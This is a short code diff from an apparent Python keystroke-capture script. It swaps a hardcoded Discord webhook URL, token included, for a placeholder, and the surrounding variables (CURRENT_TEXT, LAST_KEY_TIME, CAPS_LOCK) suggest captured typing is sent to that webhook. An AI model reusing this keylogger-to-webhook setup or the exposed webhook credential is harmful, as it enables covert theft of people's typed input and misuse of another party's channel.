@@ -7,7 +7,7 @@ import requests
 import signal
 import atexit
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1417432108422529075/3i7F4pkyuta0uzg7lXkOx4Ht9_Qq_BvK3khzs-9mEJxeGtyiEl_PNWkcEZwHla6-73AO"
+WEBHOOK_URL = "YOUR_WEBHOOK_HERE"
 CURRENT_TEXT = ""
 LAST_KEY_TIME = time.time()
 CAPS_LOCK = False
